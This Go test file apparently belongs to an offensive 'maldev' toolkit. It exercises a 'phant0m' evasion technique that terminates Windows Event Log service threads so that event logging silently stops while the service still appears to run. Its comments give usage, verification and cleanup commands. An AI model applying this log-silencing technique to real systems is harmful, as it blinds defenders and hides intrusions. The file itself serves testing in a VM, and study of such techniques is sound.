//go:build windows

package phant0m

import (
	"errors"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/testutil"
)

func TestTechnique_ImplementsInterface(t *testing.T) {
	var _ evasion.Technique = Technique()
}

// TestKillEventLogThreads terminates Event Log service threads.
//
// PREREQUISITES:
//   - Run as Administrator
//   - Run in a VM (not on your dev machine)
//   - Event Log service must be running: sc query EventLog
//
// USAGE:
//
//	MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 go test ./evasion/phant0m/ -run TestKillEventLogThreads -v
//
// VERIFY:
//
//	After test: wevtutil qe Security /c:1 should fail or return stale events.
//	The Event Log service will appear running but will not write new events.
//
// CLEANUP:
//
//	Restart the Event Log service: net stop EventLog && net start EventLog
//	Or restart the VM.
func TestKillEventLogThreads(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	err := Kill(nil)
	if errors.Is(err, ErrNoTargetThreads) {
		t.Skip("no EventLog threads with service tags on this VM — tag resolution may not be available")
	}
	require.NoError(t, err)
	t.Log("Event Log service threads terminated; event logging is now silenced")
}
